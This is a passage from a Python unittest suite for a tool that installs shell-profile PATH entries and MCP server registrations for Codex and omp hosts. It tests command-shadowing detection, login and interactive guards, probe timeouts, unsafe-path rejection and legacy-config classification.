        graft.write_bytes(b"#!/bin/sh\nexit 0\n")
        graft.chmod(0o755)
        profile = base / "profile.ps1"
        scope = {
            "shell_profiles": [
                {"path": str(profile), "shell": "powershell", "bin": str(bin_dir)}
            ],
            "decisions": {str(profile): "replace"},
        }
        resource = hosts.build_host_resources(scope, package_root=package)[0]
        _write(profile, hosts.render_resource(resource) + extra)
        entry = hosts.verify_hosts(scope, package_root=package, probe=True)[
            "shell_profiles"
        ][0]
        return entry["host"]["checks"]["command_resolution"]

    @unittest.skipUnless(
        os.name != "nt" and (shutil.which("pwsh") or shutil.which("powershell")),
        "POSIX pwsh unavailable",
    )
    def test_alias_shadowing_fails_real_probe(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            check = self._probe_entry(
                Path(directory).resolve(), b"Set-Alias graft /usr/bin/false\n"
            )
            self.assertEqual(check["status"], "failed")
            self.assertEqual(check["reason"], "graft-resolution-shadowed")

    @unittest.skipUnless(
        os.name != "nt" and (shutil.which("pwsh") or shutil.which("powershell")),
        "POSIX pwsh unavailable",
    )
    def test_function_shadowing_fails_real_probe(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            check = self._probe_entry(
                Path(directory).resolve(), b"function global:graft { }\n"
            )
            self.assertEqual(check["status"], "failed")
            self.assertEqual(check["reason"], "graft-resolution-shadowed")

    @unittest.skipUnless(
        os.name != "nt" and (shutil.which("pwsh") or shutil.which("powershell")),
        "POSIX pwsh unavailable",
    )
    def test_unshadowed_winning_command_passes_real_probe(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            check = self._probe_entry(Path(directory).resolve(), b"")
            self.assertEqual(check["status"], "verified", check)


# ---------------------------------------------------------------------------
# R08: bash/zsh probes load the selected profile under real interactive rules
# ---------------------------------------------------------------------------


class InteractiveProfileProbeTests(unittest.TestCase):
    def test_selected_profile_uses_its_login_mode(self):
        """U23: login guards run in login shells; rc files remain non-login."""
        cases = [
            ("bash", ".bash_profile", b"shopt -q login_shell || return 0\n"),
            ("bash", ".bash_login", b"shopt -q login_shell || return 0\n"),
            ("bash", ".profile", b"shopt -q login_shell || return 0\n"),
            ("bash", ".bashrc", b"shopt -q login_shell && return 0\ntrue\n"),
            ("zsh", ".zprofile", b"[[ -o login ]] || return 0\n"),
            ("zsh", ".zlogin", b"[[ -o login ]] || return 0\n"),
            ("zsh", ".zshrc", b"[[ -o login ]] && return 0\ntrue\n"),
        ]
        for shell, name, guard in cases:
            with self.subTest(shell=shell, profile=name), tempfile.TemporaryDirectory() as directory:
                if shutil.which(shell) is None:
                    self.skipTest(f"{shell} unavailable")
                base = Path(directory).resolve()
                package = _package(base)
                profile, bin_dir = base / name, base / "bin"
                bin_dir.mkdir()
                _write_graft(bin_dir)
                _write(profile, guard)
                scope = {
                    "shell_profiles": [{"path": str(profile), "shell": shell, "bin": str(bin_dir)}],
                    "decisions": {str(profile): "replace"},
                }
                resource = hosts.build_host_resources(scope, package_root=package)[0]
                _write(profile, hosts.render_resource(resource))
                result = hosts.verify_hosts(scope, package_root=package, probe=True)
                entry = result["shell_profiles"][0]
                self.assertEqual(entry["status"], "pass", entry)

    @unittest.skipUnless(shutil.which("bash"), "bash unavailable")
    def test_bash_profile_with_noninteractive_guard_proves_path(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            profile = base / ".bashrc"
            bin_dir = base / "bin"
            bin_dir.mkdir()
            _write_graft(bin_dir)
            _write(profile, b"case $- in\n  *i*) ;;\n  *) return;;\nesac\n")
            scope = {
                "shell_profiles": [
                    {"path": str(profile), "shell": "bash", "bin": str(bin_dir)}
                ],
                "decisions": {str(profile): "replace"},
            }
            resource = hosts.build_host_resources(scope, package_root=package)[0]
            _write(profile, hosts.render_resource(resource))
            entry = hosts.verify_hosts(scope, package_root=package, probe=True)[
                "shell_profiles"
            ][0]
            self.assertEqual(entry["status"], "pass", entry)

    @unittest.skipUnless(shutil.which("zsh"), "zsh unavailable")
    def test_zsh_profile_with_noninteractive_guard_proves_path(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            profile = base / ".zshrc"
            bin_dir = base / "bin"
            bin_dir.mkdir()
            _write_graft(bin_dir)
            _write(profile, b"[[ -o interactive ]] || return\n")
            scope = {
                "shell_profiles": [
                    {"path": str(profile), "shell": "zsh", "bin": str(bin_dir)}
                ],
                "decisions": {str(profile): "replace"},
            }
            resource = hosts.build_host_resources(scope, package_root=package)[0]
            _write(profile, hosts.render_resource(resource))
            entry = hosts.verify_hosts(scope, package_root=package, probe=True)[
                "shell_profiles"
            ][0]
            self.assertEqual(entry["status"], "pass", entry)

# ---------------------------------------------------------------------------
# R12 (retained contract, user-approved): an accepted project-level-only
# route is never claimed as proven by the isolated user-wide probe
# ---------------------------------------------------------------------------


class OmpProjectRouteBoundaryTests(unittest.TestCase):
    def test_project_only_route_is_not_proven_by_user_wide_probe(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            skills = _skills_root(base, ["alpha"])
            installed = skills / "sbtd-workflow-onboard"
            project = base / "project"
            managed = {
                "type": "stdio",
                "command": runtime["python"],
                "args": _managed_args(installed, runtime),
                "env": {"DO_NOT_TRACK": "1", "DNT": "1"},
            }
            _write(
                project / ".omp" / "mcp.json",
                json.dumps({"mcpServers": {"sbtd-graft": managed}}).encode("utf-8"),
            )
            host = _omp_host(
                base, runtime, skills_roots=[skills], project_roots=[project]
            )
            scope = {"hosts": [host], "skills_roots": [str(skills)]}
            before_tree = _tree_bytes(base)
            rig = _ProbeRig(self, ["alpha"]).install()
            entry = hosts.verify_hosts(scope, package_root=package, probe=True)[
                "hosts"
            ][0]
            checks = entry["host"]["checks"]
            # The project-scoped equivalent entry is accepted at build, but the
            # isolated user-wide probe fails closed on it: no host session is
            # ever spawned and no fixture graph preparation happens.
            self.assertEqual(checks["host_load"]["status"], "failed")
            self.assertEqual(
                checks["host_load"]["reason"], "effective-binding-not-aligned"
            )
            self.assertEqual(entry["status"], "fail")
            self.assertEqual(
                [spawn for spawn in rig.spawns if "--mode" in spawn[0]], []
            )
            # The real project and every other base file stay byte-identical.
            self.assertEqual(_tree_bytes(base), before_tree)




# ---------------------------------------------------------------------------
# R13: OMP evidence is the authoritative structured registry, never prompt text
# ---------------------------------------------------------------------------


class OmpAuthoritativeRegistryTests(unittest.TestCase):
    def _aligned_omp(self, base: Path, runtime, package, skills, project):
        host = _omp_host(
            base, runtime, skills_roots=[skills], project_roots=[project]
        )
        scope = {"hosts": [host], "skills_roots": [str(skills)]}
        resource = hosts.build_host_resources(scope, package_root=package)[0]
        _write(Path(host["config"]), hosts.render_resource(resource))
        return host, scope

    def test_structured_dump_tools_pass(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            skills = _skills_root(base, ["beta-skill"])
            project = base / "project"
            project.mkdir()
            _host, scope = self._aligned_omp(base, runtime, package, skills, project)
            _ProbeRig(self, ["beta-skill"]).install()
            result = hosts.verify_hosts(scope, package_root=package, probe=True)
            entry = result["hosts"][0]
            self.assertEqual(entry["status"], "pass", entry)
            checks = entry["host"]["checks"]
            self.assertEqual(checks["host_load"]["status"], "verified")

    def test_prompt_text_uris_without_registered_tools_never_pass(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            skills = _skills_root(base, ["beta-skill"])
            project = base / "project"
            project.mkdir()
            _host, scope = self._aligned_omp(base, runtime, package, skills, project)
            rig = _ProbeRig(self, ["beta-skill"]).install()
            rig.omp_dump_tools = []
            rig.omp_system_prompt = " ".join(
                f"xd://mcp__sbtd_graft_{tool}" for tool in PINNED_TOOLS
            )
            result = hosts.verify_hosts(scope, package_root=package, probe=True)
            entry = result["hosts"][0]
            checks = entry["host"]["checks"]
            self.assertEqual(checks["host_load"]["status"], "failed")
            self.assertEqual(entry["status"], "fail")

    def test_dump_tools_without_schemas_do_not_count(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            skills = _skills_root(base, ["beta-skill"])
            project = base / "project"
            project.mkdir()
            _host, scope = self._aligned_omp(base, runtime, package, skills, project)
            rig = _ProbeRig(self, ["beta-skill"]).install()
            rig.omp_dump_tools = [
                {"name": f"mcp__sbtd_graft_{tool}", "description": "schema-less"}
                for tool in PINNED_TOOLS
            ]
            result = hosts.verify_hosts(scope, package_root=package, probe=True)
            self.assertEqual(result["hosts"][0]["status"], "fail")

    def test_dump_tools_wrong_shape_is_protocol_invalid(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            skills = _skills_root(base, ["beta-skill"])
            project = base / "project"
            project.mkdir()
            _host, scope = self._aligned_omp(base, runtime, package, skills, project)
            rig = _ProbeRig(self, ["beta-skill"]).install()
            rig.omp_dump_tools = "not-a-list"
            result = hosts.verify_hosts(scope, package_root=package, probe=True)
            checks = result["hosts"][0]["host"]["checks"]
            self.assertEqual(checks["host_load"]["status"], "failed")
            self.assertEqual(checks["host_load"]["reason"], "protocol-evidence-invalid")


# ---------------------------------------------------------------------------
# R14: RPC stdin writes share the deadline; stalled children are reaped
# ---------------------------------------------------------------------------


class StalledChildDeadlineTests(unittest.TestCase):
    def test_write_beyond_pipe_capacity_times_out_and_teardown_joins(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            env = hosts._probe_env(base, {})
            proc = hosts._spawn(
                [sys.executable, "-I", "-c", "import time; time.sleep(120)"],
                env=env,
                cwd=str(base),
            )
            # Watchdog unblocks the pre-fix blocking write so the red run
            # terminates; the fixed code never reaches it.
            watchdog = threading.Timer(8.0, proc.kill)
            watchdog.daemon = True
            watchdog.start()
            started = time.monotonic()
            try:
                rpc = hosts._JsonLines(proc, 1.0)
                with self.assertRaises(hosts._ProbeError) as caught:
                    rpc.call("initialize", {"blob": "x" * (4 * 1024 * 1024)})
                self.assertEqual(caught.exception.reason, "host-response-timeout")
            finally:
                exit_code = rpc.close()
                watchdog.cancel()
            self.assertLess(time.monotonic() - started, 30.0)
            # The owned stalled child is terminated and joined, never leaked.
            self.assertIsNotNone(proc.returncode)
            self.assertIsNotNone(exit_code)
            # Owned pipe handles are sealed and pump/drain threads finished:
            # no ResourceWarning from Popen teardown at GC.
            assert proc.stdin is not None and proc.stdout is not None
            self.assertTrue(proc.stdin.closed)
            self.assertTrue(proc.stdout.closed)
            self.assertFalse(rpc._writer.is_alive())
            self.assertFalse(rpc._reader.is_alive())

    def test_healthy_child_close_seals_streams_and_threads(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            env = hosts._probe_env(base, {})
            proc = hosts._spawn(
                [
                    sys.executable,
                    "-I",
                    "-c",
                    (
                        "import json, sys\n"
                        "for line in sys.stdin:\n"
                        "    request = json.loads(line)\n"
                        "    print(json.dumps({'id': request['id'], 'result': {'ready': True}}))\n"
                        "    sys.stdout.flush()\n"
                    ),
                ],
                env=env,
                cwd=str(base),
            )
            rpc = hosts._JsonLines(proc, 5.0)
            self.assertEqual(rpc.call("initialize", {"probe": True}), {"ready": True})
            # Graceful close: stdin EOF lets the healthy child exit 0, and the
            # client seals every owned handle and finishes both threads.
            self.assertEqual(rpc.close(), 0)
            assert proc.stdin is not None and proc.stdout is not None
            self.assertTrue(proc.stdin.closed)
            self.assertTrue(proc.stdout.closed)
            self.assertFalse(rpc._writer.is_alive())
            self.assertFalse(rpc._reader.is_alive())


# ---------------------------------------------------------------------------
# R15: PATH entries that cannot be represented are refused before writing
# ---------------------------------------------------------------------------


class PathSeparatorRejectionTests(unittest.TestCase):
    def _build(self, base: Path, shell: str, bin_dir: str):
        return hosts.build_host_resources(
            {
                "shell_profiles": [
                    {"path": str(base / "profile"), "shell": shell, "bin": bin_dir}
                ]
            },
            package_root=_package(base),
        )

    @unittest.skipIf(os.name == "nt", "POSIX PATH separator case")
    def test_posix_bin_with_colon_is_rejected_before_write(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            bin_dir = str(base / "bin:withcolon")
            for shell in ("bash", "zsh", "powershell"):
                with self.subTest(shell=shell):
                    with self.assertRaises(ContractError) as caught:
                        self._build(base, shell, bin_dir)
                    self.assertEqual(caught.exception.code, "unsafe-path")
            with self.assertRaises(ContractError) as caught:
                hosts._shell_profile_candidate(b"", shell="bash", bin_dir="/a:b/bin")
            self.assertEqual(caught.exception.code, "unsafe-path")

    @unittest.skipIf(os.name == "nt", "POSIX PATH separator case")
    def test_posix_semicolon_bin_is_representable(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            bin_dir = base / "bin;withsemicolon"
            resources = self._build(base, "bash", str(bin_dir))
            self.assertEqual(resources[0]["decision"], "install")

    @unittest.skipUnless(os.name == "nt", "native Windows separator case")
    def test_windows_bin_with_semicolon_is_rejected_for_powershell(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            with self.assertRaises(ContractError) as caught:
                self._build(base, "powershell", str(base / "bin;with"))
            self.assertEqual(caught.exception.code, "unsafe-path")

    @unittest.skipUnless(os.name == "nt", "native Windows separator case")
    def test_windows_drive_tail_colon_is_rejected_for_bash(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            with self.assertRaises(ContractError) as caught:
                self._build(base, "bash", "C:\\tools:bad\\bin")
            self.assertEqual(caught.exception.code, "unsafe-path")
            # The Git Bash /c alias form stays supported.
            resources = self._build(base, "bash", str(base / "bin"))
            self.assertEqual(resources[0]["decision"], "install")


# ---------------------------------------------------------------------------
# R16: oh-my-pi normalizes to canonical omp through the inventory rule
# ---------------------------------------------------------------------------


class HostPlatformNormalizationTests(unittest.TestCase):
    def test_oh_my_pi_platform_is_canonicalized_to_omp(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _omp_host(base, runtime)
            host["platform"] = "oh-my-pi"
            resources = hosts.build_host_resources({"hosts": [host]}, package_root=package)
            self.assertEqual(len(resources), 1)
            self.assertEqual(resources[0]["kind"], "mcp")
            self.assertEqual(resources[0]["host"]["platform"], "omp")
            result = hosts.verify_hosts({"hosts": [host]}, package_root=package)
            entry = result["hosts"][0]
            self.assertEqual(entry["platform"], "omp")
            self.assertEqual(entry["applicability"], "supported")
            self.assertEqual(entry["disk"]["status"], "missing")

    def test_oh_my_pi_profile_variant_resolves(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            host = _omp_host(base, runtime, profile="work")
            host["platform"] = "oh-my-pi"
            resources = hosts.build_host_resources(
                {"hosts": [host]}, package_root=_package(base)
            )
            self.assertEqual(len(resources), 1)
            self.assertEqual(resources[0]["classification"], "missing")


# ---------------------------------------------------------------------------
# R18: legacy dimension separates valid unrelated configs from malformed ones
# ---------------------------------------------------------------------------


class LegacyMcpClassificationTests(unittest.TestCase):
    def _legacy(self, host, package) -> dict:
        return hosts.verify_hosts({"hosts": [host]}, package_root=package)["hosts"][0][
            "legacy"
        ]

    def test_omp_incomplete_runtime_cannot_prove_inherited_legacy_absent(self):
        """U36: skipped discovery is unknown even when the active file is absent."""
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime, package = _runtime(base), _package(base)
            host = _omp_host(base, runtime)
            _write(base / "account/.codex/config.toml", _codex_toml(
                runtime["python"], _managed_args(package, runtime),
            ).replace(b"sbtd-graft", b"sbtd-graft-old"))
            host["runtime"] = {"python": None, "node": None, "cli": None}
            legacy = self._legacy(host, package)
            self.assertEqual(legacy["status"], "unknown", legacy)
            self.assertFalse(Path(host["config"]).exists())

    def test_nonfile_config_is_unknown_not_legacy_free(self):
        """U30: a present directory cannot prove that legacy entries are absent."""
        for factory in (_codex_host, _omp_host):
            with self.subTest(platform=factory.__name__), tempfile.TemporaryDirectory() as directory:
                base = Path(directory).resolve()
                runtime, package = _runtime(base), _package(base)
                host = factory(base, runtime)
                Path(host["config"]).mkdir(parents=True)
                self.assertEqual(
                    self._legacy(host, package),
                    {"status": "unknown", "reason": "invalid-config"},
                )


    def test_omp_legacy_uses_only_enabled_inherited_sources(self):
        """U30: inherited retired entries count; unselected providers do not."""
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime, package = _runtime(base), _package(base)
            host = _omp_host(base, runtime)
            codex = base / "account/.codex/config.toml"
            retired = "sbtd-graft-old"
            _write(codex, _codex_toml(
                runtime["python"], _managed_args(package, runtime),
            ).replace(b"sbtd-graft", retired.encode()))
            settings = Path(host["config"]).parent / "config.yml"
            for enabled in (True, False):
                with self.subTest(enabled=enabled):
                    _write(settings, (
                        b'enabledProviders: ["codex"]\n'
                        if enabled else b'disabledProviders: ["codex"]\n'
                    ))
                    expected = {"status": "present", "entries": [retired]} if enabled else {"status": "none", "entries": []}
                    self.assertEqual(self._legacy(host, package), expected)
            self.assertFalse(Path(host["config"]).exists())

    def test_valid_codex_config_with_only_unrelated_servers_reports_none(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            host = _codex_host(base, runtime)
            _write(
                Path(host["config"]),
                b'[mcp_servers.other]\ncommand = "/usr/bin/other"\n',
            )
            self.assertEqual(
                self._legacy(host, _package(base)), {"status": "none", "entries": []}
            )

    def test_valid_omp_config_with_only_unrelated_servers_reports_none(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            host = _omp_host(base, runtime)
            _write(
                Path(host["config"]),
                json.dumps(
                    {"mcpServers": {"other": {"type": "stdio", "command": "/usr/bin/other"}}}
                ).encode("utf-8"),
            )
            self.assertEqual(
                self._legacy(host, _package(base)), {"status": "none", "entries": []}
            )

    def test_malformed_codex_config_reports_unknown(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            host = _codex_host(base, runtime)
            _write(Path(host["config"]), b"[mcp_servers\n")
            legacy = self._legacy(host, _package(base))
            self.assertEqual(legacy["status"], "unknown")
            self.assertEqual(legacy["reason"], "invalid-config")

    def test_malformed_omp_config_reports_unknown(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            host = _omp_host(base, runtime)
            _write(Path(host["config"]), b'{"mcpServers": ')
            legacy = self._legacy(host, _package(base))
            self.assertEqual(legacy["status"], "unknown")
            self.assertEqual(legacy["reason"], "invalid-config")

    def test_wrong_shape_servers_reports_unknown(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            host = _omp_host(base, runtime)
            _write(Path(host["config"]), b'{"mcpServers": "nope"}')
            legacy = self._legacy(host, _package(base))
            self.assertEqual(legacy["status"], "unknown")

    def test_null_omp_servers_section_reports_unknown(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            host = _omp_host(base, runtime)
            _write(Path(host["config"]), b'{"mcpServers": null}')
            legacy = self._legacy(host, _package(base))
            self.assertEqual(legacy["status"], "unknown")
            self.assertEqual(legacy["reason"], "invalid-config")

    def test_nonobject_server_entries_report_unknown(self) -> None:
        for label, payload in (
            ("unrelated-null", {"mcpServers": {"other": None}}),
            ("owned-null", {"mcpServers": {"sbtd-graft": None}}),
        ):
            with self.subTest(entry=label), tempfile.TemporaryDirectory() as directory:
                base = Path(directory).resolve()
                runtime = _runtime(base)
                host = _omp_host(base, runtime)
                _write(Path(host["config"]), json.dumps(payload).encode("utf-8"))
                legacy = self._legacy(host, _package(base))
                self.assertEqual(legacy["status"], "unknown")
                self.assertEqual(legacy["reason"], "invalid-config")

    def test_read_conflict_after_snapshot_reports_unknown(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            host = _omp_host(base, runtime)
            _write(
                Path(host["config"]),
                b'{"mcpServers":{"other":{"type":"stdio","command":"/usr/bin/o"}}}',
            )
            with mock.patch.object(
                hosts,
                "read_file",
                side_effect=ContractError("state-conflict", "changed mid-read"),
            ):
                legacy = hosts._legacy_mcp(host)
            self.assertEqual(legacy["status"], "unknown")
            # Read races keep the pre-existing contract reason, distinct from
            # malformed-content invalid-config.
            self.assertEqual(legacy["reason"], "state-conflict")

    def test_empty_config_reports_none(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            host = _codex_host(base, runtime)
            _write(Path(host["config"]), b"")
            self.assertEqual(
                self._legacy(host, _package(base)), {"status": "none", "entries": []}
            )

if __name__ == "__main__":
    unittest.main()
